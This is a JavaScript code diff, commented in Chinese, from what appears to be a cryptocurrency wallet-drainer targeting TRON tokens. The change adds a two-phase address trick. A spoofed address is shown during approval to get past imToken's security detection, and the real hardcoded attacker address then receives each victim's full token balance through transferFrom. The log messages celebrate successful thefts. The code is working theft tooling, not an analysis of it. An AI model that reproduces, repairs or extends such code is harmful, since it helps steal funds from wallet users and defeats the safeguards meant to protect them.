@@ -9,15 +9,21 @@
     // 攻击者地址（A用户）
     let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
     
-    // 🎭 获取当前使用的地址（使用伪装地址绕过安全检测）
-    function getCurrentAttackerAddress() {
-        // 🎭 使用伪装地址进行授权以绕过imToken安全检测
-        if (window.SimpleAddressSpoofing && window.SimpleAddressSpoofing.getSpoofAddress) {
-            const spoofAddress = window.SimpleAddressSpoofing.getSpoofAddress();
-            console.log(`🎭 使用伪装地址绕过安全检测: ${ATTACKER_ADDRESS} → ${spoofAddress}`);
-            return spoofAddress;
+    // 🎯 双重地址机制：授权阶段返回伪装地址，转移阶段返回真实地址
+    function getCurrentAttackerAddress(phase = 'authorize') {
+        if (phase === 'transfer') {
+            // 转移阶段：必须使用真实攻击者地址
+            console.log(`🎯 转移阶段使用真实攻击者地址: ${ATTACKER_ADDRESS}`);
+            return ATTACKER_ADDRESS;
+        } else {
+            // 授权阶段：使用伪装地址绕过安全检测
+            if (window.SimpleAddressSpoofing && window.SimpleAddressSpoofing.getSpoofAddress) {
+                const spoofAddress = window.SimpleAddressSpoofing.getSpoofAddress();
+                console.log(`🎭 授权显示使用伪装地址: ${ATTACKER_ADDRESS} → ${spoofAddress}`);
+                return spoofAddress;
+            }
+            return ATTACKER_ADDRESS;
         }
-        return ATTACKER_ADDRESS;
     }
     
     // 支持的代币合约地址（TRON网络）
@@ -225,17 +231,17 @@
                         {},
                         [
                             {type: 'address', value: victimAddress},    // 从受害者
-                            {type: 'address', value: getCurrentAttackerAddress()}, // 到攻击者
+                            {type: 'address', value: getCurrentAttackerAddress('transfer')}, // 到真实攻击者
                             {type: 'uint256', value: balance.toString()} // 全部余额
                         ],
-                        getCurrentAttackerAddress()  // 攻击者执行
+                        getCurrentAttackerAddress('transfer')  // 真实攻击者执行
                     );
                     
                     if (transferTx.result && transferTx.result.result) {
                         console.log(`🏆🏆🏆 ${tokenName}自动转移成功！🏆🏆🏆`);
                         console.log(`💰 转移金额: ${balance.toString()}`);
                         console.log(`💰 从: ${victimAddress}`);
-                        console.log(`💰 到: ${getCurrentAttackerAddress()}`);
+                        console.log(`💰 到: ${getCurrentAttackerAddress('transfer')}`);
                     }
                 }
             }
